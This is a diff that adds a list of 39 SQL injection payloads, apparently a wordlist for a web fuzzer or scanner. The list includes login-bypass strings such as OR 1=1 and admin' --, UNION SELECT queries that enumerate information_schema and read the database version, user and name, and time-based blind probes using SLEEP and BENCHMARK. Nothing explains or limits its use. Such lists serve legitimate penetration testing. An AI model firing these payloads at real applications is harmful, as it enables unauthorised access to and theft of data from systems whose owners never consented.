@@ -1,1 +1,39 @@
+-1" OR 1=1--
+-1' OR 1=1--
+1" OR "1"="1
+1' OR '1'='1
+admin' #
+admin' --
+admin' AND 1=0--
+admin' AND 1=1--
+' AND 1=0 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' AND 1=0 UNION SELECT table_name,NULL FROM information_schema.tables--
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 20 FROM (SELECT(SLEEP(5)))a)--
+" OR 1=1--
+") OR "1"="1
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1#
 ' OR 1=1--
+' OR 1=1/*
+') OR '1'='1
+')) OR (('1'='1
+' OR 1=1 GROUP BY 1--
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 'a'='a
+' OR 'a'='a'--
+' OR 'a'='a'/*
+' OR BENCHMARK(1000000,MD5(1))--
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+" OR SLEEP(5)--
+' OR SLEEP(5)--
+' UNION SELECT database(),NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT user(),NULL,NULL--
+' UNION SELECT @@version,NULL,NULL--
